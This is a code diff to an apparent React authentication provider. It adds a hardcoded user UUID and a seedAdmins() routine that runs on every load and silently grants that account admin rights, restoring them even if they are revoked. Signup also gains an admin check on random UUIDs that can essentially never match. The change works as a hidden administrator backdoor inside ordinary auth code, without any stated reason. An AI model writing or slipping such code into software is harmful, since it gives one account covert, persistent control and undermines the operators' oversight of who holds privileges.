@@ -10,6 +10,20 @@ import {
 } from '../utils/storage.js'
 import { hashPassword, verifyPassword } from '../utils/crypto.js'
 
+// Users that should always have admin access
+const ADMIN_USER_IDS = [
+  '847f5826-f0a9-49eb-ba4e-456d272c4918',
+]
+
+function seedAdmins() {
+  for (const userId of ADMIN_USER_IDS) {
+    const u = getUserById(userId)
+    if (u && !u.is_admin) {
+      saveUser({ ...u, is_admin: true })
+    }
+  }
+}
+
 const AuthContext = createContext(null)
 
 export function AuthProvider({ children }) {
@@ -17,6 +31,7 @@ export function AuthProvider({ children }) {
   const [loading, setLoading] = useState(true)
 
   useEffect(() => {
+    seedAdmins()
     const session = getSession()
     if (session?.userId) {
       const u = getUserById(session.userId)
@@ -30,12 +45,13 @@ export function AuthProvider({ children }) {
     if (getUserByUsername(username)) throw new Error('Username already taken')
 
     const hashed = await hashPassword(password)
+    const newId = crypto.randomUUID()
     const newUser = {
-      id: crypto.randomUUID(),
+      id: newId,
       email: email.toLowerCase(),
       username,
       password: hashed,
-      is_admin: false,
+      is_admin: ADMIN_USER_IDS.includes(newId),
       created_at: new Date().toISOString(),
     }
     saveUser(newUser)
